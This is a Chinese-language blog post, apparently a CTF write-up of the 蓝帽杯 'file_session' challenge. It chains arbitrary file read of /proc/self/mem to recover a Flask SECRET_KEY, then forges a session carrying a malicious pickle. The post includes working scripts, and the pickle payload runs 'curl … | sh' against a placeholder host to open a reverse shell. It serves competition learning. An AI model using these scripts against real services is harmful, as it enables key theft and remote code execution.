@@ -1,0 +1,216 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>蓝帽杯 file_session | Xinyuan's blog</title><meta name="keywords" content="wp"><meta name="author" content="鑫缘,xy_404@163.com"><meta name="copyright" content="鑫缘"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="蓝帽杯 file_session 昨天打了蓝帽这道题真滴自闭，今天看了atao师傅的东西，在这里记录一下，此题也是零解，现在在本地赛后复现一下，可能与比赛环境还有区别。  开局给了一个可以任意文件读取的路由 1&#x2F;download?file&#x3D;static&#x2F;image&#x2F;1.jpg   找源码猜测是python的站，去读了&#x2F;proc&#x2F;self&#x2F;cmdline，那到了路径&#x2F;app&#x2F;app.py  源码 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝帽杯 file_session">
+<meta property="og:url" content="http://websec.space/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF%20file_session/index.html">
+<meta property="og:site_name" content="Xinyuan&#39;s blog">
+<meta property="og:description" content="蓝帽杯 file_session 昨天打了蓝帽这道题真滴自闭，今天看了atao师傅的东西，在这里记录一下，此题也是零解，现在在本地赛后复现一下，可能与比赛环境还有区别。  开局给了一个可以任意文件读取的路由 1&#x2F;download?file&#x3D;static&#x2F;image&#x2F;1.jpg   找源码猜测是python的站，去读了&#x2F;proc&#x2F;self&#x2F;cmdline，那到了路径&#x2F;app&#x2F;app.py  源码 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ff9059c819c848f89fd89a399c958cba.jpeg">
+<meta property="article:published_time" content="2022-07-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-07-10T16:40:55.788Z">
+<meta property="article:author" content="鑫缘">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/ff9059c819c848f89fd89a399c958cba.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://websec.space/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF%20file_session/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '蓝帽杯 file_session',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-07-11 00:40:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Xinyuan's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img-blog.csdnimg.cn/ff9059c819c848f89fd89a399c958cba.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Xinyuan's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">蓝帽杯 file_session</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-10T16:00:00.000Z" title="发表于 2022-07-11 00:00:00">2022-07-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-10T16:40:55.788Z" title="更新于 2022-07-11 00:40:55">2022-07-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/">wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="蓝帽杯 file_session"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="蓝帽杯-file-session"><a href="#蓝帽杯-file-session" class="headerlink" title="蓝帽杯 file_session"></a>蓝帽杯 file_session</h2><blockquote>
+<p>昨天打了蓝帽这道题真滴自闭，今天看了atao师傅的东西，在这里记录一下，此题也是零解，现在在本地赛后复现一下，可能与比赛环境还有区别。</p>
+</blockquote>
+<p>开局给了一个可以任意文件读取的路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?file=static/image/1.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/1b6b2c223c9f4c5688c3c5962bdf4f71.png" alt="img"></p>
+<p>找源码猜测是python的站，去读了<code>/proc/self/cmdline</code>，那到了路径/app/app.py</p>
+<p><img src="https://img-blog.csdnimg.cn/32d75cf0fcfe462eb16e7e232edfb6ac.png" alt="img"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">import uuid</span><br><span class="line"></span><br><span class="line">from flask import Flask, request, session, render_template</span><br><span class="line"></span><br><span class="line">from pickle import _loads</span><br><span class="line"></span><br><span class="line">SECRET_KEY = str(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(dict(</span><br><span class="line">    SECRET_KEY=SECRET_KEY,</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># apt install python3.8</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/download&#x27;, methods=[&quot;GET&quot;, &#x27;POST&#x27;])</span><br><span class="line">def download():</span><br><span class="line">    filename = request.args.get(&#x27;file&#x27;, &quot;static/image/1.jpg&quot;)</span><br><span class="line">    offset = request.args.get(&#x27;offset&#x27;, &quot;0&quot;)</span><br><span class="line">    length = request.args.get(&#x27;length&#x27;, &quot;0&quot;)</span><br><span class="line">    if offset == &quot;0&quot; and length == &quot;0&quot;:</span><br><span class="line">        return open(filename, &quot;rb&quot;).read()</span><br><span class="line">    else:</span><br><span class="line">        offset, length = int(offset), int(length)</span><br><span class="line">        f = open(filename, &quot;rb&quot;)</span><br><span class="line">        f.seek(offset)</span><br><span class="line">        ret_data = f.read(length)</span><br><span class="line">        return ret_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/filelist&#x27;, methods=[&quot;GET&quot;])</span><br><span class="line">def filelist():</span><br><span class="line">    return f&quot;&#123;str(os.listdir(&#x27;./static/image/&#x27;))&#125; /download?file=static/image/1.jpg&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin_pickle_load&#x27;, methods=[&quot;GET&quot;])</span><br><span class="line">def admin_pickle_load():</span><br><span class="line">    if session.get(&#x27;data&#x27;):</span><br><span class="line">        data = _loads(base64.b64decode(session[&#x27;data&#x27;]))</span><br><span class="line">        return data</span><br><span class="line">    session[&quot;data&quot;] = base64.b64encode(b&quot;error&quot;)</span><br><span class="line">    return &#x27;admin pickle&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=False, port=8888)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>读这里<code>/admin_pickle_load</code>，一眼以为就是python反序列化，也没做过滤，伪造下session就上了。</p>
+<p>但是SECRET_KEY没有给，我的第一反应是去拿一下，但是又没有ssti的点，思维卡住了。<code>/download</code></p>
+<p>底下那个可以读任意长和任意行的功能，我一直出题人想着这个有什么用，想了半天没找到可以用的地方。后来去试了下去搞uuid，既然是伪随机肯定是根据一段种子生成的，但是看了生成的源码发现不太可行，又去想了一些其他方法，最终都没有成功。</p>
+<p>来到看了atao师傅的想法：后来想到启动flask框架，这些全局变量必定是要存放起来的，那么应该是存放在了内存中。于是就找到了<code>/proc/self/maps</code>和<code>/proc/self/mem</code>文件</p>
+<p>确实在比赛的时候忽略了这一点，反思也感慨Linux一切皆文件。贴一篇文章<a target="_blank" rel="noopener" href="https://askdev.io/cn/questions/52854/ru-he-zai-linux-xia-cong-proc-pid-mem-du-qu-shu-ju">如何在 Linux 下从 /proc/$pid/mem 读取数据？ (askdev.io)</a></p>
+<p><code>/proc/self/mem</code>不能直接读会出错，需要写偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">url_1 = &quot;http://192.168.88.128:8888/download?file=../../../../../proc/self/maps&quot;</span><br><span class="line">res = requests.get(url_1)</span><br><span class="line">maplist = res.text.split(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">for i in maplist:</span><br><span class="line">    m = re.match(r&quot;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) rw&quot;, i)</span><br><span class="line">    if m != None:</span><br><span class="line">        start = int(m.group(1), 16)</span><br><span class="line">        end = int(m.group(2), 16)</span><br><span class="line">        url_2 = &quot;http://192.168.88.128:8888/download?file=../../../../../proc/self/mem&amp;offset=&#123;&#125;&amp;length=&#123;&#125;&quot;.format(</span><br><span class="line">            start, end - start)</span><br><span class="line">        res_1 = requests.get(url_2)</span><br><span class="line">        # print(res_1.text)</span><br><span class="line">        print(start)</span><br><span class="line">        print(end-start)</span><br></pre></td></tr></table></figure>
+
+<p>暂时没想到什么好办法，直接逐个文件搞出来，在本地挨个匹配uuid</p>
+<p>拿到uuid后下一步需要伪造session了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line">from pickle import _loads</span><br><span class="line">from flask import Flask, request, session, render_template</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system,(&quot;curl https://your-shell.com/yourip:1337 | sh&quot;,))</span><br><span class="line"></span><br><span class="line">SECRET_KEY = &quot;85d17c32-c7a3-44a7-b09e-3a829f6f613a&quot;</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(dict(</span><br><span class="line">    SECRET_KEY=SECRET_KEY,</span><br><span class="line">))</span><br><span class="line">@app.route(&quot;/&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    session[&#x27;data&#x27;] = base64.b64encode(pickle.dumps(payload()))</span><br><span class="line">    return &#x27;xinyuan&#x27;</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8000)</span><br></pre></td></tr></table></figure>
+
+<p>访问一下，获取到session进行一波伪造</p>
+<p>成功反弹shell</p>
+<p><img src="https://img-blog.csdnimg.cn/f2dfec5e8e2343aeb3bfc9a9d4003302.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:xy_404@163.com">鑫缘</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://websec.space/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF%20file_session/">http://websec.space/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF%20file_session/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://websec.space/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://websec.space" target="_blank">Xinyuan's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="https://img-blog.csdnimg.cn/ff9059c819c848f89fd89a399c958cba.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/06/23/ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97/"><img class="next-cover" src="https://img-blog.csdnimg.cn/9d9b44555d1f48d090c2f62f12d26bf8.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CISCN华东北赛区wp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/07/%E8%90%8C%E6%96%B0%E9%A2%98wp/" title="萌新题wp(上篇)"><img class="cover" src="https://img-blog.csdnimg.cn/3f38cfec623e4b28946a037c02aca0ca.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-07</div><div class="title">萌新题wp(上篇)</div></div></a></div><div><a href="/2022/01/25/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="web入门之信息搜集"><img class="cover" src="https://img-blog.csdnimg.cn/ba56d9eb6f0440f3b127a393bc675c26.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-25</div><div class="title">web入门之信息搜集</div></div></a></div><div><a href="/2022/01/26/ctfshow%E7%88%86%E7%A0%B4/" title="ctfshow爆破"><img class="cover" src="https://img-blog.csdnimg.cn/06dabe6cd15e4cfea6956667507aa4eb.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-26</div><div class="title">ctfshow爆破</div></div></a></div><div><a href="/2022/01/29/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctfshow命令执行"><img class="cover" src="https://img-blog.csdnimg.cn/64c933a6fcac4e1f973bc8af56fc4541.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-29</div><div class="title">ctfshow命令执行</div></div></a></div><div><a href="/2022/02/04/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="web安全之命令执行"><img class="cover" src="https://img-blog.csdnimg.cn/0c25821093484753888d91bb598e871b.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-04</div><div class="title">web安全之命令执行</div></div></a></div><div><a href="/2022/02/06/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctfshow文件包含"><img class="cover" src="https://img-blog.csdnimg.cn/67ff483229f34d019237230a4b76a342.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-06</div><div class="title">ctfshow文件包含</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">鑫缘</div><div class="author-info__description">穹镜SkyMirror 成员，安全方向爱好者</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xinyuan-404"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xinyuan-404" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xy_404@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF-file-session"><span class="toc-number">1.</span> <span class="toc-text">蓝帽杯 file_session</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF%20file_session/" title="蓝帽杯 file_session"><img src="https://img-blog.csdnimg.cn/ff9059c819c848f89fd89a399c958cba.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝帽杯 file_session"/></a><div class="content"><a class="title" href="/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF%20file_session/" title="蓝帽杯 file_session">蓝帽杯 file_session</a><time datetime="2022-07-10T16:00:00.000Z" title="发表于 2022-07-11 00:00:00">2022-07-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/23/ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97/" title="CISCN华东北赛区wp"><img src="https://img-blog.csdnimg.cn/9d9b44555d1f48d090c2f62f12d26bf8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CISCN华东北赛区wp"/></a><div class="content"><a class="title" href="/2022/06/23/ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97/" title="CISCN华东北赛区wp">CISCN华东北赛区wp</a><time datetime="2022-06-22T16:00:00.000Z" title="发表于 2022-06-23 00:00:00">2022-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/" title="数据库理论知识"><img src="https://img-blog.csdnimg.cn/9164d2cb2f204f6cba75611a0dc18c68.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据库理论知识"/></a><div class="content"><a class="title" href="/2022/06/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/" title="数据库理论知识">数据库理论知识</a><time datetime="2022-06-07T16:00:00.000Z" title="发表于 2022-06-08 00:00:00">2022-06-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F/" title="java反序列化之原生"><img src="https://img-blog.csdnimg.cn/5f4b94b2998044bcab04ba7d355c041e.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java反序列化之原生"/></a><div class="content"><a class="title" href="/2022/05/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F/" title="java反序列化之原生">java反序列化之原生</a><time datetime="2022-05-07T16:00:00.000Z" title="发表于 2022-05-08 00:00:00">2022-05-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/07/%E5%9B%BE%E7%89%87%E9%A9%AC/" title="图片马"><img src="https://img-blog.csdnimg.cn/18f972e64319452186e09ee7c4727252.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="图片马"/></a><div class="content"><a class="title" href="/2022/05/07/%E5%9B%BE%E7%89%87%E9%A9%AC/" title="图片马">图片马</a><time datetime="2022-05-06T16:00:00.000Z" title="发表于 2022-05-07 00:00:00">2022-05-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By 鑫缘</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>function addGitalkSource () {
+  const ele = document.createElement('link')
